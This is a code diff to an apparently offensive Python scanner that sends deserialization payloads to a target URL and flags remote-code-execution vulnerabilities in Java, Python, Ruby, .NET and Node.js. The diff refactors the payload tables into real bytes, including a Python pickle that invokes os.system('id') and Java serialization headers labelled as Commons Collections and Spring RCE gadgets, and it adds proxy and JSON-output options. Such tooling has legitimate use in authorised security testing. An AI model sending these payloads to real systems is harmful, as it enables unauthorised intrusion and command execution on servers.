@@ -35,6 +35,7 @@ Fluxo:
 import argparse
 import logging
 import time
+from collections.abc import Sequence
 from dataclasses import asdict, dataclass
 
 import httpx
@@ -45,7 +46,9 @@ from mytools.core.utils import (
     color,
     create_async_client,
     create_banner,
+    init_scanner,
     print_exploit_info,
+    print_json,
     run_main_loop,
     safe_asyncio_run,
     write_output,
@@ -131,26 +134,26 @@ _PHP_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 ]
 
 
-_JAVA_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+_JAVA_PAYLOADS_DEFAULT: list[tuple[str, str | bytes, list[str | bytes]]] = [
     (
         "java_magic_bytes",
-        "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11",
-        ["\\xac\\xed", "serialization", "java", "object"],
+        b"\xac\xed\x00\x05\x73\x72\x00\x11",
+        [b"\xac\xed", "serialization", "java", "object"],
     ),
     (
         "java_obj_stream",
-        "\\xac\\xed\\x00\\x05\\x74\\x00\\x04test",
-        ["\\xac\\xed", "ObjectInputStream", "readObject", "java"],
+        b"\xac\xed\x00\x05\x74\x00\x04test",
+        [b"\xac\xed", "ObjectInputStream", "readObject", "java"],
     ),
     (
         "java_gadget_cc",
-        "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x3a",
-        ["\\xac\\xed", "gadget", "Commons", "Collections", "RCE"],
+        b"\xac\xed\x00\x05\x73\x72\x00\x3a",
+        [b"\xac\xed", "gadget", "Commons", "Collections", "RCE"],
     ),
     (
         "java_gadget_spring",
-        "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x2f",
-        ["\\xac\\xed", "Spring", "gadget", "RCE", "deserialize"],
+        b"\xac\xed\x00\x05\x73\x72\x00\x2f",
+        [b"\xac\xed", "Spring", "gadget", "RCE", "deserialize"],
     ),
     (
         "java_jndi",
@@ -160,11 +163,11 @@ _JAVA_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 ]
 
 
-_PYTHON_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+_PYTHON_PAYLOADS_DEFAULT: list[tuple[str, str | bytes, list[str | bytes]]] = [
     (
         "python_pickle",
-        "\\x80\\x04\\x95\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x04os\\x94\\x8c\\x06system\\x94\\x8c\\x04id\\x94\\x93\\x94.",
-        ["\\x80\\x04", "pickle", "reduce", "os.system", "serialize"],
+        b"\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x04os\x94\x8c\x06system\x94\x8c\x04id\x94\x93\x94.",
+        [b"\x80\x04", "pickle", "reduce", "os.system", "serialize"],
     ),
     (
         "python_reduce",
@@ -178,13 +181,13 @@ _PYTHON_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
     ),
     (
         "python_marshal",
-        "\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
-        ["\\xe3", "marshal", "code", "compile", "deserialize"],
+        b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+        [b"\xe3", "marshal", "code", "compile", "deserialize"],
     ),
     (
         "python_shelve",
-        "\\x80\\x04\\x95\\x0e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x04shelve",
-        ["\\x80\\x04", "shelve", "pickle", "serialize", "marshal"],
+        b"\x80\x04\x95\x0e\x00\x00\x00\x00\x00\x00\x00\x8c\x04shelve",
+        [b"\x80\x04", "shelve", "pickle", "serialize", "marshal"],
     ),
 ]
 
@@ -247,11 +250,11 @@ _BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 ]
 
 
-_RUBY_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+_RUBY_PAYLOADS_DEFAULT: list[tuple[str, str | bytes, list[str | bytes]]] = [
     (
         "ruby_marshal",
-        "\\x04\\x08I\\x40\\x06\\x01\\x06\\x06T\\x30\\x06\\x06n\\x06\\x10admin",
-        ["\\x04\\x08", "Marshal", "ruby", "serialize", "object"],
+        b"\x04\x08I\x40\x06\x01\x06\x06T\x30\x06\x06n\x06\x10admin",
+        [b"\x04\x08", "Marshal", "ruby", "serialize", "object"],
     ),
     (
         "ruby_yaml",
@@ -386,7 +389,7 @@ def _load_php_payloads() -> list[tuple[str, str, list[str]]]:
 _PHP_PAYLOADS = _load_php_payloads()
 
 
-def _load_java_payloads() -> list[tuple[str, str, list[str]]]:
+def _load_java_payloads() -> list[tuple[str, str | bytes, list[str | bytes]]]:
 
     from mytools.data import load_payloads
 
@@ -405,7 +408,7 @@ def _load_java_payloads() -> list[tuple[str, str, list[str]]]:
 _JAVA_PAYLOADS = _load_java_payloads()
 
 
-def _load_python_payloads() -> list[tuple[str, str, list[str]]]:
+def _load_python_payloads() -> list[tuple[str, str | bytes, list[str | bytes]]]:
 
     from mytools.data import load_payloads
 
@@ -468,7 +471,7 @@ def _load_bypass_payloads() -> list[tuple[str, str, list[str]]]:
 _BYPASS_PAYLOADS = _load_bypass_payloads()
 
 
-def _load_ruby_payloads() -> list[tuple[str, str, list[str]]]:
+def _load_ruby_payloads() -> list[tuple[str, str | bytes, list[str | bytes]]]:
 
     from mytools.data import load_payloads
 
@@ -551,7 +554,7 @@ class DeserialAttempt:
 
     category: str
 
-    payload: str
+    payload: str | bytes
 
     param: str
 
@@ -603,7 +606,9 @@ class DeserialResult:
     overall_status: str
 
 
-def _check_deserial_response(body: bytes, status: int, indicators: list[str]) -> bool:
+def _check_deserial_response(
+    body: bytes, status: int, indicators: Sequence[str | bytes]
+) -> bool:
     """Verifica se a resposta indica desserializacao."""
 
     if status == 0:
@@ -611,7 +616,14 @@ def _check_deserial_response(body: bytes, status: int, indicators: list[str]) ->
 
     text = body.decode("utf-8", errors="ignore").lower()
 
-    return any(ind.lower() in text for ind in indicators)
+    for indicator in indicators:
+        if isinstance(indicator, bytes):
+            if indicator in body:
+                return True
+        elif indicator.lower() in text:
+            return True
+
+    return False
 
 
 async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
@@ -706,60 +718,60 @@ async def _test_java(
     results: list[DeserialAttempt] = []
 
     for technique, payload, indicators in _JAVA_PAYLOADS:
-        for param in _SSI_PARAMS[:3]:
-            try:
-                resp = await client.post(
-                    url,
-                    content=payload.encode() if isinstance(payload, str) else payload,
-                    follow_redirects=True,
-                )
+        param = _SSI_PARAMS[0]
+        try:
+            resp = await client.post(
+                url,
+                content=payload.encode() if isinstance(payload, str) else payload,
+                follow_redirects=True,
+            )
 
-                vulnerable = _check_deserial_response(
-                    resp.content, resp.status_code, indicators
-                )
+            vulnerable = _check_deserial_response(
+                resp.content, resp.status_code, indicators
+            )
 
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="java",
-                        payload=payload,
-                        param=param,
-                        method="post_raw",
-                        status_baseline=b_status,
-                        status_test=resp.status_code,
-                        size_baseline=b_size,
-                        size_test=len(resp.content),
-                        status_changed=resp.status_code != b_status,
-                        size_changed=len(resp.content) != b_size,
-                        vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}"
-                        if vulnerable
-                        else "",
-                        error="",
-                        exploit="ysoserial_payload" if vulnerable else "",
-                        tool="ysoserial",
-                    )
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="java",
+                    payload=payload,
+                    param=param,
+                    method="post_raw",
+                    status_baseline=b_status,
+                    status_test=resp.status_code,
+                    size_baseline=b_size,
+                    size_test=len(resp.content),
+                    status_changed=resp.status_code != b_status,
+                    size_changed=len(resp.content) != b_size,
+                    vulnerable=vulnerable,
+                    details=f"param={param}, indicators={indicators}"
+                    if vulnerable
+                    else "",
+                    error="",
+                    exploit="ysoserial_payload" if vulnerable else "",
+                    tool="ysoserial",
                 )
+            )
 
-            except httpx.RequestError as e:
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="java",
-                        payload=payload,
-                        param=param,
-                        method="post_raw",
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(e)[:100],
-                    )
+        except httpx.RequestError as e:
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="java",
+                    payload=payload,
+                    param=param,
+                    method="post_raw",
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
                 )
+            )
 
     return results
 
@@ -776,60 +788,60 @@ async def _test_python(
     results: list[DeserialAttempt] = []
 
     for technique, payload, indicators in _PYTHON_PAYLOADS:
-        for param in _SSI_PARAMS[:3]:
-            try:
-                resp = await client.post(
-                    url,
-                    content=payload.encode() if isinstance(payload, str) else payload,
-                    follow_redirects=True,
-                )
+        param = _SSI_PARAMS[0]
+        try:
+            resp = await client.post(
+                url,
+                content=payload.encode() if isinstance(payload, str) else payload,
+                follow_redirects=True,
+            )
 
-                vulnerable = _check_deserial_response(
-                    resp.content, resp.status_code, indicators
-                )
+            vulnerable = _check_deserial_response(
+                resp.content, resp.status_code, indicators
+            )
 
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="python",
-                        payload=payload,
-                        param=param,
-                        method="post_raw",
-                        status_baseline=b_status,
-                        status_test=resp.status_code,
-                        size_baseline=b_size,
-                        size_test=len(resp.content),
-                        status_changed=resp.status_code != b_status,
-                        size_changed=len(resp.content) != b_size,
-                        vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}"
-                        if vulnerable
-                        else "",
-                        error="",
-                        exploit="ysoserial_payload" if vulnerable else "",
-                        tool="ysoserial",
-                    )
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="python",
+                    payload=payload,
+                    param=param,
+                    method="post_raw",
+                    status_baseline=b_status,
+                    status_test=resp.status_code,
+                    size_baseline=b_size,
+                    size_test=len(resp.content),
+                    status_changed=resp.status_code != b_status,
+                    size_changed=len(resp.content) != b_size,
+                    vulnerable=vulnerable,
+                    details=f"param={param}, indicators={indicators}"
+                    if vulnerable
+                    else "",
+                    error="",
+                    exploit="ysoserial_payload" if vulnerable else "",
+                    tool="ysoserial",
                 )
+            )
 
-            except httpx.RequestError as e:
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="python",
-                        payload=payload,
-                        param=param,
-                        method="post_raw",
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(e)[:100],
-                    )
+        except httpx.RequestError as e:
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="python",
+                    payload=payload,
+                    param=param,
+                    method="post_raw",
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
                 )
+            )
 
     return results
 
@@ -851,13 +863,19 @@ async def _test_detect(
                 if technique == "timing_anomaly":
                     t0 = time.monotonic()
 
+                    await client.post(url, json={param: ""}, follow_redirects=True)
+
+                    baseline_elapsed = time.monotonic() - t0
+
+                    t0 = time.monotonic()
+
                     resp = await client.post(
                         url, json={param: payload}, follow_redirects=True
                     )
 
                     elapsed = time.monotonic() - t0
 
-                    vulnerable = elapsed > 2.0
+                    vulnerable = elapsed > 2.0 and elapsed >= baseline_elapsed + 1.0
 
                 else:
                     resp = await client.post(
@@ -926,58 +944,58 @@ async def _test_bypass(
     results: list[DeserialAttempt] = []
 
     for technique, payload, indicators in _BYPASS_PAYLOADS:
-        for param in _SSI_PARAMS[:3]:
-            try:
-                json_data = {param: payload}
+        param = _SSI_PARAMS[0]
+        try:
+            json_data = {param: payload}
 
-                resp = await client.post(url, json=json_data, follow_redirects=True)
+            resp = await client.post(url, json=json_data, follow_redirects=True)
 
-                vulnerable = _check_deserial_response(
-                    resp.content, resp.status_code, indicators
+            vulnerable = _check_deserial_response(
+                resp.content, resp.status_code, indicators
+            )
+
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="bypass",
+                    payload=payload,
+                    param=param,
+                    method="post_json",
+                    status_baseline=b_status,
+                    status_test=resp.status_code,
+                    size_baseline=b_size,
+                    size_test=len(resp.content),
+                    status_changed=resp.status_code != b_status,
+                    size_changed=len(resp.content) != b_size,
+                    vulnerable=vulnerable,
+                    details=f"param={param}, indicators={indicators}"
+                    if vulnerable
+                    else "",
+                    error="",
+                    exploit="ysoserial_payload" if vulnerable else "",
+                    tool="ysoserial",
                 )
+            )
 
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="bypass",
-                        payload=payload,
-                        param=param,
-                        method="post_json",
-                        status_baseline=b_status,
-                        status_test=resp.status_code,
-                        size_baseline=b_size,
-                        size_test=len(resp.content),
-                        status_changed=resp.status_code != b_status,
-                        size_changed=len(resp.content) != b_size,
-                        vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}"
-                        if vulnerable
-                        else "",
-                        error="",
-                        exploit="ysoserial_payload" if vulnerable else "",
-                        tool="ysoserial",
-                    )
+        except httpx.RequestError as e:
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="bypass",
+                    payload=payload,
+                    param=param,
+                    method="post_json",
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
                 )
-
-            except httpx.RequestError as e:
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="bypass",
-                        payload=payload,
-                        param=param,
-                        method="post_json",
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(e)[:100],
-                    )
-                )
+            )
 
     return results
 
@@ -994,58 +1012,60 @@ async def _test_ruby(
     results: list[DeserialAttempt] = []
 
     for technique, payload, indicators in _RUBY_PAYLOADS:
-        for param in _SSI_PARAMS[:3]:
-            try:
-                json_data = {param: payload}
+        param = _SSI_PARAMS[0]
+        try:
+            resp = await client.post(
+                url,
+                content=payload.encode() if isinstance(payload, str) else payload,
+                follow_redirects=True,
+            )
 
-                resp = await client.post(url, json=json_data, follow_redirects=True)
+            vulnerable = _check_deserial_response(
+                resp.content, resp.status_code, indicators
+            )
 
-                vulnerable = _check_deserial_response(
-                    resp.content, resp.status_code, indicators
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="ruby",
+                    payload=payload,
+                    param=param,
+                    method="post_raw",
+                    status_baseline=b_status,
+                    status_test=resp.status_code,
+                    size_baseline=b_size,
+                    size_test=len(resp.content),
+                    status_changed=resp.status_code != b_status,
+                    size_changed=len(resp.content) != b_size,
+                    vulnerable=vulnerable,
+                    details=f"param={param}, indicators={indicators}"
+                    if vulnerable
+                    else "",
+                    error="",
+                    exploit="marshal_payload" if vulnerable else "",
+                    tool="marshal",
                 )
+            )
 
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="ruby",
-                        payload=payload,
-                        param=param,
-                        method="post_json",
-                        status_baseline=b_status,
-                        status_test=resp.status_code,
-                        size_baseline=b_size,
-                        size_test=len(resp.content),
-                        status_changed=resp.status_code != b_status,
-                        size_changed=len(resp.content) != b_size,
-                        vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}"
-                        if vulnerable
-                        else "",
-                        error="",
-                        exploit="marshal_payload" if vulnerable else "",
-                        tool="marshal",
-                    )
+        except httpx.RequestError as e:
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="ruby",
+                    payload=payload,
+                    param=param,
+                    method="post_raw",
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
                 )
-
-            except httpx.RequestError as e:
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="ruby",
-                        payload=payload,
-                        param=param,
-                        method="post_json",
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(e)[:100],
-                    )
-                )
+            )
 
     return results
 
@@ -1062,60 +1082,60 @@ async def _test_dotnet(
     results: list[DeserialAttempt] = []
 
     for technique, payload, indicators in _DOTNET_PAYLOADS:
-        for param in _SSI_PARAMS[:3]:
-            try:
-                resp = await client.post(
-                    url,
-                    content=payload.encode() if isinstance(payload, str) else payload,
-                    follow_redirects=True,
-                )
+        param = _SSI_PARAMS[0]
+        try:
+            resp = await client.post(
+                url,
+                content=payload.encode() if isinstance(payload, str) else payload,
+                follow_redirects=True,
+            )
 
-                vulnerable = _check_deserial_response(
-                    resp.content, resp.status_code, indicators
-                )
+            vulnerable = _check_deserial_response(
+                resp.content, resp.status_code, indicators
+            )
 
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="dotnet",
-                        payload=payload,
-                        param=param,
-                        method="post_raw",
-                        status_baseline=b_status,
-                        status_test=resp.status_code,
-                        size_baseline=b_size,
-                        size_test=len(resp.content),
-                        status_changed=resp.status_code != b_status,
-                        size_changed=len(resp.content) != b_size,
-                        vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}"
-                        if vulnerable
-                        else "",
-                        error="",
-                        exploit="binary_formatter_payload" if vulnerable else "",
-                        tool="ysoserial.net",
-                    )
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="dotnet",
+                    payload=payload,
+                    param=param,
+                    method="post_raw",
+                    status_baseline=b_status,
+                    status_test=resp.status_code,
+                    size_baseline=b_size,
+                    size_test=len(resp.content),
+                    status_changed=resp.status_code != b_status,
+                    size_changed=len(resp.content) != b_size,
+                    vulnerable=vulnerable,
+                    details=f"param={param}, indicators={indicators}"
+                    if vulnerable
+                    else "",
+                    error="",
+                    exploit="binary_formatter_payload" if vulnerable else "",
+                    tool="ysoserial.net",
                 )
+            )
 
-            except httpx.RequestError as e:
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="dotnet",
-                        payload=payload,
-                        param=param,
-                        method="post_raw",
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(e)[:100],
-                    )
+        except httpx.RequestError as e:
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="dotnet",
+                    payload=payload,
+                    param=param,
+                    method="post_raw",
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
                 )
+            )
 
     return results
 
@@ -1132,58 +1152,58 @@ async def _test_nodejs(
     results: list[DeserialAttempt] = []
 
     for technique, payload, indicators in _NODEJS_PAYLOADS:
-        for param in _SSI_PARAMS[:3]:
-            try:
-                json_data = {param: payload}
+        param = _SSI_PARAMS[0]
+        try:
+            json_data = {param: payload}
 
-                resp = await client.post(url, json=json_data, follow_redirects=True)
+            resp = await client.post(url, json=json_data, follow_redirects=True)
 
-                vulnerable = _check_deserial_response(
-                    resp.content, resp.status_code, indicators
+            vulnerable = _check_deserial_response(
+                resp.content, resp.status_code, indicators
+            )
+
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="nodejs",
+                    payload=payload,
+                    param=param,
+                    method="post_json",
+                    status_baseline=b_status,
+                    status_test=resp.status_code,
+                    size_baseline=b_size,
+                    size_test=len(resp.content),
+                    status_changed=resp.status_code != b_status,
+                    size_changed=len(resp.content) != b_size,
+                    vulnerable=vulnerable,
+                    details=f"param={param}, indicators={indicators}"
+                    if vulnerable
+                    else "",
+                    error="",
+                    exploit="node_serialize_rce" if vulnerable else "",
+                    tool="node-serialize",
                 )
+            )
 
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="nodejs",
-                        payload=payload,
-                        param=param,
-                        method="post_json",
-                        status_baseline=b_status,
-                        status_test=resp.status_code,
-                        size_baseline=b_size,
-                        size_test=len(resp.content),
-                        status_changed=resp.status_code != b_status,
-                        size_changed=len(resp.content) != b_size,
-                        vulnerable=vulnerable,
-                        details=f"param={param}, indicators={indicators}"
-                        if vulnerable
-                        else "",
-                        error="",
-                        exploit="node_serialize_rce" if vulnerable else "",
-                        tool="node-serialize",
-                    )
+        except httpx.RequestError as e:
+            results.append(
+                DeserialAttempt(
+                    technique=technique,
+                    category="nodejs",
+                    payload=payload,
+                    param=param,
+                    method="post_json",
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
                 )
-
-            except httpx.RequestError as e:
-                results.append(
-                    DeserialAttempt(
-                        technique=technique,
-                        category="nodejs",
-                        payload=payload,
-                        param=param,
-                        method="post_json",
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(e)[:100],
-                    )
-                )
+            )
 
     return results
 
@@ -1242,12 +1262,14 @@ async def run_scan(
     concurrency: int,
     output_file: str | None,
     verbose: bool,
+    proxy: str | None = None,
+    json_output: bool = False,
 ) -> int:
     """Executa o scan de Deserialization Injection."""
 
     logger.info("Deserialization scan para %s", target)
 
-    async with create_async_client(timeout=timeout) as client:
+    async with create_async_client(timeout=timeout, proxy=proxy) as client:
         b_status, b_size, _ = await _test_baseline(client, target)
 
         if b_status == 0:
@@ -1309,10 +1331,19 @@ async def run_scan(
             overall_status="vulnerable" if vulnerable else "secure",
         )
 
-        print_results(result)
+        if json_output:
+            print_json(asdict(result))
+        else:
+            print_results(result)
 
         if output_file:
-            write_output(output_file, asdict(result))
+            data = asdict(result)
+
+            for attempt in data["attempts"]:
+                if isinstance(attempt["payload"], bytes):
+                    attempt["payload"] = attempt["payload"].hex()
+
+            write_output(output_file, data)
 
             logger.info("Resultados salvos em %s", output_file)
 
@@ -1371,6 +1402,8 @@ def build_parser() -> argparse.ArgumentParser:
 def run_once(args: argparse.Namespace) -> int:
     """Executa um scan Deserialization a partir de argumentos parseados."""
 
+    init_scanner(args)
+
     logger.info("Deserialization scan iniciado para %s", args.url)
 
     categories: list[str] = []
@@ -1386,6 +1419,8 @@ def run_once(args: argparse.Namespace) -> int:
             concurrency=getattr(args, "concurrency", 5),
             output_file=getattr(args, "output", None),
             verbose=getattr(args, "verbose", False),
+            proxy=getattr(args, "proxy", None),
+            json_output=getattr(args, "json_output", False),
         ),
     )
 
